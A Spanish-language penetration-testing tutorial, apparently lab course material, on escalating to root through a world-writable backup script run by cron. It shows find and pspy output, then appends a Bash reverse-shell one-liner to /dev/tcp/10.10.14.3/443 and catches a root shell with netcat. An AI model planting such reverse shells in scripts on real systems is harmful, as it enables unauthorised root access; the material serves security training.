Los cron jobs también pueden configurarse para ejecutarse una sola vez (como en el arranque). Normalmente se utilizan para tareas administrativas como hacer backups, limpiar directorios, etc. El comando `crontab` puede crear un archivo cron, que será ejecutado por el daemon cron en el horario especificado. Cuando se crea, el archivo cron se guardará en `/var/spool/cron` para el usuario específico que lo crea. Cada entrada en el archivo crontab requiere seis elementos en el siguiente orden: minutos, horas, días, meses, semanas, comandos. Por ejemplo, la entrada `0 */12 * * * /home/admin/backup.sh` se ejecutaría cada 12 horas.

El crontab de root casi siempre solo es editable por el usuario root o un usuario con privilegios sudo completos; sin embargo, aún puede ser abusado. Puedes encontrar un script con permisos de escritura para todos los usuarios que se ejecuta como root y, incluso si no puedes leer el crontab para saber el horario exacto, puedes averiguar con qué frecuencia se ejecuta (es decir, un script de backup que crea un archivo `.tar.gz` cada 12 horas). En este caso, puedes agregar un comando al final del script (como un one-liner de reverse shell), y se ejecutará la próxima vez que se ejecute el cron job.

Algunas aplicaciones crean archivos cron en el directorio `/etc/cron.d` y pueden estar mal configuradas para permitir que un usuario que no es root las edite.

Primero, echemos un vistazo al sistema en busca de archivos o directorios con permisos de escritura. El archivo `backup.sh` en el directorio `/dmz-backups` es interesante y parece que podría estar ejecutándose en un cron job.

```r
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>
/home/backupsvc/backup.sh

<SNIP>
```

Un vistazo rápido al directorio `/dmz-backups` muestra lo que parecen ser archivos creados cada tres minutos. Esto parece ser una gran mala configuración. Quizás el sysadmin quiso especificar cada tres horas como `0 */3 * * *` pero en su lugar escribió `*/3 * * * *`, lo que indica que el cron job se ejecute cada tres minutos. El segundo problema es que el script `backup.sh` es editable por todos los usuarios y se ejecuta como root.

```r
ls -la /dmz-backups/

total 36
drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..
-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
-rw-r--r--  1 root root 3336 Aug 31 02:24 www-backup-2020831-02:24:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:27 www-backup-2020831-02:27:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:30 www-backup-2020831-02:30:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:33 www-backup-2020831-02:33:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:36 www-backup-2020831-02:36:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz
```

Podemos confirmar que un cron job se está ejecutando utilizando [pspy](https://github.com/DominicBreuker/pspy), una herramienta de línea de comandos utilizada para ver procesos en ejecución sin necesidad de privilegios de root. Podemos usarla para ver comandos ejecutados por otros usuarios, cron jobs, etc. Funciona escaneando [procfs](https://en.wikipedia.org/wiki/Procfs).

Vamos a ejecutar `pspy` y echar un vistazo. La bandera `-pf` le dice a la herramienta que imprima comandos y eventos del sistema de archivos, y `-i 1000` le indica que escanee [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) cada 1000ms (o cada segundo).

```r
./pspy64 -pf -i 1000

pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2020/09/04 20:45:03 CMD: UID=0    PID=999    | /usr/bin/VGAuthService 
2020/09/04 20:45:03 CMD: UID=111  PID=990    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
2020/09/04 20:45:03 CMD: UID=0    PID=99     | 
2020/09/04 20:45:03 CMD: UID=0    PID=988    | /usr/lib/snapd/snapd 

<SNIP>

2020/09/04 20:45:03 CMD: UID=0    PID=1017   | /usr/sbin/cron -f 
2020/09/04 20:45:03 CMD: UID=0    PID=1010   | /usr/sbin/atd -f 
2020/09/04 20:45:03 CMD: UID=0    PID=1003   | /usr/lib/accountsservice/accounts-daemon 
2020/09/04 20:45:03 CMD: UID=0    PID=1001   | /lib/systemd/systemd-logind 
2020/09/04 20:45:03 CMD: UID=0    PID=10     | 
2020/09/04 20:45:03 CMD: UID=0    PID=1      | /sbin/init 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2203   | 
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2205   | gzip 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:03 CMD: UID=0    PID=2206   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
```

Del resultado anterior, podemos ver que un cron job ejecuta el script `backup.sh` ubicado en el directorio `/dmz-backups` y crea un archivo tarball del contenido del directorio `/var/www/html`.

Podemos mirar el script shell y agregarle un comando para intentar obtener un reverse shell como root. Si editamos un script, asegúrate de `SIEMPRE` tomar una copia del script y/o crear un backup del mismo. También deberíamos intentar agregar nuestros comandos al final del script para que siga funcionando correctamente antes de ejecutar nuestro comando de reverse shell.

```r
cat /dmz-backups/backup.sh 

#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

Podemos ver que el script solo toma un directorio fuente y un directorio de destino como variables. Luego especifica un nombre de archivo con la fecha y hora actual del backup y crea un archivo tarball del directorio fuente, el directorio raíz web. Vamos a modificar el script para agregar un [one-liner de reverse shell en Bash](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

```r
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

Modificamos el script, levantamos un listener local de `netcat`, y esperamos. Seguro, dentro de tres minutos, tenemos un shell root.

```r
nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
bash: cannot set terminal process group (9143): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id
id
uid=0(root) gid=0(root) groups=0(root)

root@NIX02:~# hostname
hostname
NIX02
```

Aunque no es el ataque más común, encontramos cron jobs mal configurados que pueden ser abusados de vez en cuando.